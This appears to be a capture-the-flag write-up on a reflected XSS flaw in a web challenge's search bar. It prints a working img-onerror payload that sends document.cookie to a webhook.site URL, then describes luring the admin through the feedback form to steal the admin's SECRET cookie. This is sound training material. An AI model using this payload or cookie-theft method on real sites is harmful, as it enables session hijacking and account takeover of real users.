# Challenge `My favourite cookies` writeup

- Vulnerability: XSS vulnerability
- Where: *Search* bar
- Impact: We can inject any code in the *search* bar that will be reflected in the web browser. This code can include a link to a website you are controlling and by doing a request to it you can collect the cookies of who did the request

## Steps to reproduce

1. On the online service **Webhook** save the URL that is provided to you (e.g. *https://webhook.site/f48996ee-018f-4ca1-9fa7-fabd21d53ea8*). You can make requests to this URL and observe the content of that requests
2. On the *Search* bar inject the following code: `<img src=x onerror="this.src='https://webhook.site/f48996ee-018f-4ca1-9fa7-fabd21d53ea8?c='+document.cookie; this.removeAttribute('onerror');">`. We use the **img** tag since it can have an URL value on the **src** parameter
3. Click on *Search* 
4. This time we want the admin's cookies so we have to lure the admin to click the link with the vulnerability we found. On the Feedback part of the website there a place where you can insert text and on the **Link of the bug/feature request you want to report on.** section appears the code we searched in URL format. If we click on *Submit* it will do a request to that website
5. Access the Webhook site again and it will appear a new GET request with a query *c* whose value is the admin's cookies (`?c='+document.cookie`)
6. In the admin's cookies there is a cookie called **SECRET** whose value is the flag




